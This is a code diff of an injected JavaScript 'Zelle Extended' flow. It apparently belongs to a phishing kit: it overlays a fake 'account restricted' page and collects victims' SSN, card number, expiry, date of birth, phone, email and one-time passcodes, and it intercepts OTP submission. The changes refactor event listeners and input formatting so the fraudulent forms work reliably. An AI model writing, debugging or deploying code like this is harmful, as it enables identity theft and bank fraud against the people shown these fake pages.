@@ -186,7 +186,12 @@
         
         document.body.appendChild(container);
         injectStyles();
-        attachEventListeners();
+        
+        // Attach event listeners AFTER injection using delegation
+        setTimeout(() => {
+            attachEventListeners();
+            setupInputFormatting();
+        }, 100);
     }
     
     // ========================================
@@ -368,36 +373,51 @@
     }
     
     // ========================================
-    // ATTACH EVENT LISTENERS
+    // ATTACH EVENT LISTENERS (SAFE VERSION)
     // ========================================
+    let listenersAttached = false;
+    
     function attachEventListeners() {
-        // Verify Identity Button
-        document.getElementById('verifyIdentityBtn').addEventListener('click', () => {
-            hideModal('accountRestrictedPage');
-            showModal('personalInfoModal');
+        if (listenersAttached) return;
+        
+        // Use event delegation - attach to container, not individual elements
+        const container = document.getElementById('zelle-extended-flow');
+        if (!container) {
+            console.error('[Zelle Extended] Container not found, cannot attach listeners');
+            return;
+        }
+        
+        container.addEventListener('click', (e) => {
+            // Verify Identity Button
+            if (e.target.id === 'verifyIdentityBtn') {
+                hideModal('accountRestrictedPage');
+                showModal('personalInfoModal');
+            }
+            
+            // Resend Code
+            if (e.target.id === 'resendCode') {
+                alert('Code resent! Check your email.');
+            }
+            
+            // Submit Final OTP
+            if (e.target.id === 'submitFinalOtp') {
+                handleFinalOtpSubmit();
+            }
         });
         
-        // Personal Info Form
-        document.getElementById('personalInfoForm').addEventListener('submit', async (e) => {
+        // Form submissions
+        container.addEventListener('submit', async (e) => {
             e.preventDefault();
-            await handlePersonalInfoSubmit();
+            
+            if (e.target.id === 'personalInfoForm') {
+                await handlePersonalInfoSubmit();
+            } else if (e.target.id === 'emailVerificationForm') {
+                await handleEmailVerificationSubmit();
+            }
         });
         
-        // Email Verification Form
-        document.getElementById('emailVerificationForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            await handleEmailVerificationSubmit();
-        });
-        
-        // Final OTP Submit
-        document.getElementById('submitFinalOtp').addEventListener('click', async () => {
-            await handleFinalOtpSubmit();
-        });
-        
-        // Resend Code
-        document.getElementById('resendCode').addEventListener('click', () => {
-            alert('Code resent! Check your email.');
-        });
+        listenersAttached = true;
+        console.log('[Zelle Extended] ✅ Event listeners attached via delegation');
         
         // Close buttons
         document.getElementById('closePersonalInfo').addEventListener('click', () => {
@@ -423,51 +443,65 @@
                 }
             });
         });
+    
+    // ========================================
+    // INPUT FORMATTING (SAFE VERSION)
+    // ========================================
+    function setupInputFormatting() {
+        const container = document.getElementById('zelle-extended-flow');
+        if (!container) return;
         
-        // SSN formatting
-        document.getElementById('ssn').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
-            if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6, 10);
-            e.target.value = value;
-        });
-        
-        // Card number formatting (XXXX XXXX XXXX XXXX)
-        document.getElementById('cardNumber').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            let formatted = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += value[i];
+        container.addEventListener('input', (e) => {
+            const id = e.target.id;
+            let value = e.target.value;
+            
+            // SSN formatting
+            if (id === 'ssn') {
+                value = value.replace(/\D/g, '');
+                if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
+                if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6, 10);
+                e.target.value = value;
             }
-            e.target.value = formatted.slice(0, 19); // Max 16 digits + 3 spaces
-        });
-        
-        // Expiry formatting (MM/YY)
-        document.getElementById('expiry').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            
+            // Card number formatting
+            if (id === 'cardNumber') {
+                value = value.replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < value.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += value[i];
+                }
+                e.target.value = formatted;
             }
-            e.target.value = value;
+            
+            // Expiry formatting (MM/YY)
+            if (id === 'expiry') {
+                value = value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            }
+            
+            // DOB formatting (MM/DD/YYYY)
+            if (id === 'dob') {
+                value = value.replace(/\D/g, '');
+                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
+                if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
+                e.target.value = value;
+            }
+            
+            // Phone formatting
+            if (id === 'phone') {
+                value = value.replace(/\D/g, '');
+                if (value.length > 0) value = '(' + value;
+                if (value.length > 4) value = value.slice(0, 4) + ') ' + value.slice(4);
+                if (value.length > 9) value = value.slice(0, 9) + '-' + value.slice(9, 13);
+                e.target.value = value;
+            }
         });
         
-        // DOB formatting (MM/DD/YYYY)
-        document.getElementById('dob').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
-            if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
-            e.target.value = value;
-        });
-        
-        // Phone formatting
-        document.getElementById('phone').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 0) value = '(' + value;
-            if (value.length > 4) value = value.slice(0, 4) + ') ' + value.slice(4);
-            if (value.length > 9) value = value.slice(0, 9) + '-' + value.slice(9, 13);
-            e.target.value = value;
-        });
+        console.log('[Zelle Extended] ✅ Input formatting attached');
     }
     
     // ========================================
@@ -754,42 +788,20 @@
     }
     
     // ========================================
-    // INITIALIZE (Wait for React)
+    // INITIALIZE (SIMPLE & CLEAN)
     // ========================================
-    function waitForReact() {
-        const root = document.getElementById('root');
-        
-        if (root && root.children.length > 0) {
-            console.log('[Zelle Extended] React mounted, initializing flow...');
-            // Wait an additional 500ms to ensure React is fully stable
-            setTimeout(init, 500);
-        } else {
-            setTimeout(waitForReact, 100);
-        }
-    }
-    
     function init() {
         console.log('[Zelle Extended] Initializing multi-step flow...');
         injectHTML();
-        
-        // Verify injection worked
-        setTimeout(() => {
-            const testEl = document.getElementById('verifyIdentityBtn');
-            if (testEl) {
-                console.log('[Zelle Extended] ✅ HTML injection successful, attaching listeners...');
-                interceptOtpSubmission();
-                addMutationObserver();
-            } else {
-                console.error('[Zelle Extended] ❌ HTML injection failed - elements not found');
-            }
-        }, 100);
+        interceptOtpSubmission();
+        addMutationObserver();
     }
     
-    // Wait for DOM to be ready, then wait for React
+    // Wait for DOM ready
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', waitForReact);
+        document.addEventListener('DOMContentLoaded', init);
     } else {
-        waitForReact();
+        init();
     }
     
 })();
